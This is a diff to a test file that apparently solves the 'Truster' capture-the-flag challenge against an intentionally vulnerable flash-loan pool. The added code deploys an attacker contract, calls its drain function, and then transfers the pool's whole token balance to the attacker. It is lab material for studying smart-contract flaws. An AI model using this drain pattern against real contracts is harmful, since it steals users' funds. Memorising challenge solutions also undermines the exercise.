@@ -29,6 +29,26 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        const customFactory = await ethers.getContractFactory('AttackTruster', attacker);
+        const custom = await customFactory.deploy(attacker.address);
+
+        const tx = await custom.populateTransaction.drain(
+            this.pool.address,
+            this.token.address,
+            );
+        await attacker.sendTransaction(tx);
+
+        const erc20 = new ethers.Contract(
+          this.token.address,
+          ["function transferFrom(address,address,uint256) returns (bool)"],
+          attacker
+        );
+
+        const tx2 = await erc20.transferFrom(
+            this.pool.address,
+            attacker.address,
+            TOKENS_IN_POOL
+            );
     });
 
     after(async function () {
